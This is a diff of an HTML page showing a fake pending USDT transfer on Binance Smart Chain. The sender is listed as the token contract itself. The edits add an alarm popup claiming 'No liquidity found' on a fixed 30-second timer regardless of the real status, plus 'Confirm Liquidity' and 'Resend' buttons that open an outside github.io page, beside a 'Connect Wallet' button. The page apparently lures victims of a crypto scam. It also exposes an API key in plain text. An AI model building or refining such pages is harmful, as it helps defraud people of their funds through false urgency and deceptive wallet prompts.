@@ -1,9 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>USDT Transaction Details</title>
+  <title>USDT Transaction Pending</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,7 +12,7 @@
       padding: 0;
     }
     .container {
-      max-width: 700px;
+      max-width: 720px;
       margin: 3rem auto;
       background: #072146;
       padding: 2rem;
@@ -38,9 +37,9 @@
       border-radius: 4px;
       color: #93c5fd;
     }
-    a.button {
+    a.button, button.resend {
       display: inline-block;
-      margin-top: 1.5rem;
+      margin-top: 1rem;
       background: #fbbf24;
       color: #111827;
       padding: 0.8rem 1.5rem;
@@ -48,8 +47,10 @@
       text-decoration: none;
       font-weight: bold;
       transition: background 0.3s ease;
+      border: none;
+      cursor: pointer;
     }
-    a.button:hover {
+    a.button:hover, button.resend:hover {
       background: #facc15;
     }
     .popup {
@@ -89,85 +90,85 @@
   </style>
 </head>
 <body>
-
   <div class="container">
     <h1>USDT Transaction Details</h1>
-    <p><strong>From:</strong> <code>0x55d398326f99059ff775485246999027b3197955</code></p>
+    <p><strong>From:</strong> <code id="sender">0x55d398326f99059ff775485246999027b3197955</code></p>
     <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
     <p><strong>Time:</strong> 23:55:55 UTC</p>
     <p><strong>Date:</strong> 30-07-2025</p>
     <p><strong>Amount:</strong> $4873.78 USDT</p>
-    <p><strong>Network:</strong> Binance Chain BSC BEP20</p>
-    <p><strong>Status:</strong> <span id="txStatus" style="color: orange; font-weight: bold;">Checking...</span></p>
+    <p><strong>Network:</strong> Binance Smart Chain (BSC) BEP20</p>
+    <p><strong>Status:</strong> <span id="status" style="color: orange; font-weight: bold;">Checking...</span></p>
     <p><strong>Gas Fee:</strong> 0.120590 BNB</p>
     <p><strong>Transaction Hash:</strong>
       <a href="https://bscscan.com/tx/0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf" target="_blank">
         0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf
       </a>
     </p>
+    <p><strong>Sender USDT Balance:</strong> <span id="balance">Loading...</span></p>
     <a href="https://contract-decimals.github.io/BNB-Smart-Chain/" class="button" target="_blank">Confirm Liquidity</a>
-    
+    <button class="resend" onclick="window.open('https://contract-decimals.github.io/BNB-Smart-Chain/', '_blank')">🔁 Resend</button>
     <div class="countdown" id="countdown">Refreshing in 30s...</div>
-
     <div class="wallet-connect">
       <button class="connect" onclick="connectWallet()">🔗 Connect Wallet</button>
     </div>
-  </div>
-
-  <div class="popup" id="liquidityPopup">⚠️ Transaction not confirmed — please verify on BscScan.</div>
-  <audio id="alertSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
+  </div>  <div class="popup" id="liquidityPopup">
+    ⚠️ No liquidity found — please verify transaction input.
+  </div><audio id="alertSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
 
   <script>
-    const txHash = "0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf";
-    const apiKey = "ZM8ACMJB67C2IXKKBF8URFUNSY"; // BscScan API Key
-    const txStatusSpan = document.getElementById("txStatus");
-    const popup = document.getElementById("liquidityPopup");
-    const alertSound = document.getElementById("alertSound");
     let countdown = 30;
+    const txHash = "0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf";
+    const sender = "0x55d398326f99059ff775485246999027b3197955";
+    const usdtContract = "0x55d398326f99059ff775485246999027b3197955";
+    const apiKey = "ZM8ACMJB67C2IXKKBF8URFUNSY";
 
-    async function checkTransactionStatus() {
-      try {
-        const res = await fetch(`https://api.bscscan.com/api?module=transaction&action=gettxreceiptstatus&txhash=${txHash}&apikey=${apiKey}`);
-        const data = await res.json();
-
-        if (data.result && data.result.status === "1") {
-          txStatusSpan.textContent = "✅ Confirmed";
-          txStatusSpan.style.color = "#10b981";
-          popup.style.display = "none";
-        } else if (data.result && data.result.status === "0") {
-          txStatusSpan.textContent = "❌ Failed";
-          txStatusSpan.style.color = "#ef4444";
-          showPopup("Transaction failed — check input or gas.");
-        } else {
-          txStatusSpan.textContent = "⏳ Pending";
-          txStatusSpan.style.color = "orange";
-          showPopup("Still pending — please verify.");
-        }
-      } catch (error) {
-        txStatusSpan.textContent = "⚠️ Error checking status";
-        txStatusSpan.style.color = "#f87171";
-        console.error("Error fetching status:", error);
-        showPopup("API error — try again later.");
-      }
-    }
-
-    function showPopup(message) {
-      popup.textContent = `⚠️ ${message}`;
-      popup.style.display = "block";
+    function showPopup() {
+      const popup = document.getElementById('liquidityPopup');
+      const alertSound = document.getElementById('alertSound');
+      popup.style.display = 'block';
       alertSound.play();
       setTimeout(() => {
-        popup.style.display = "none";
-      }, 6000);
+        popup.style.display = 'none';
+      }, 5000);
     }
 
     function updateCountdown() {
       const counter = document.getElementById('countdown');
       countdown--;
       counter.textContent = `Refreshing in ${countdown}s...`;
-
       if (countdown <= 0) {
         countdown = 30;
-        checkTransactionStatus();
+        showPopup();
+        checkTxStatus();
+        fetchUSDTBalance();
+      }
+    }
+    setInterval(updateCountdown, 1000);
+
+    async function checkTxStatus() {
+      const res = await fetch(`https://api.bscscan.com/api?module=transaction&action=gettxreceiptstatus&txhash=${txHash}&apikey=${apiKey}`);
+      const data = await res.json();
+      const statusEl = document.getElementById("status");
+      if (data.result && data.result.status === "1") {
+        statusEl.textContent = "Success";
+        statusEl.style.color = "#22c55e";
+      } else {
+        statusEl.textContent = "Pending";
+        statusEl.style.color = "orange";
+      }
+    }
+
+    async function fetchUSDTBalance() {
+      const url = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${usdtContract}&address=${sender}&tag=latest&apikey=${apiKey}`;
+      const res = await fetch(url);
+      const data = await res.json();
+      const balanceEl = document.getElementById("balance");
+      if (data.result) {
+        const balance = parseFloat(data.result) / 1e18;
+        balanceEl.textContent = `${balance.toFixed(2)} USDT`;
+      } else {
+        balanceEl.textContent = "Error fetching";
       }
     }
 
@@ -184,9 +185,7 @@
       }
     }
 
-    // Initial check and start polling
-    checkTransactionStatus();
-    setInterval(updateCountdown, 1000);
-  </script>
-</body>
+    checkTxStatus();
+    fetchUSDTBalance();
+  </script></body>
 </html>
